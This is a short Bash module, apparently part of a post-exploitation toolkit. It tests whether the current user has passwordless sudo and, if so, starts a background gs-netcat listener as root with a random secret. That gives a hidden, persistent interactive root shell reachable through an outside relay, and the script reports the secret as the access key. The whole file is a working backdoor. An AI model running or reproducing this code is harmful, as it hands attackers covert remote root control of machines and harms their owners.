#!/bin/bash
source "$(dirname "$0")/00_common.sh"
M="sudo"
info "Checking sudo..."
out=$(timeout 3 sudo -n -l 2>/dev/null)
[ -z "$out" ] && { result "$M" "skip" "No sudo" ""; exit 1; }
if echo "$out"|grep -q "NOPASSWD: ALL"; then
    s=$(cat /dev/urandom|tr -dc 'a-z0-9'|head -c20)
    sudo -n bash -c "nohup gs-netcat -s '$s' -l -i &>/dev/null &" 2>/dev/null
    result "$M" "success" "NOPASSWD ALL" "$s"; exit 0
fi
result "$M" "fail" "Limited sudo" ""; exit 1
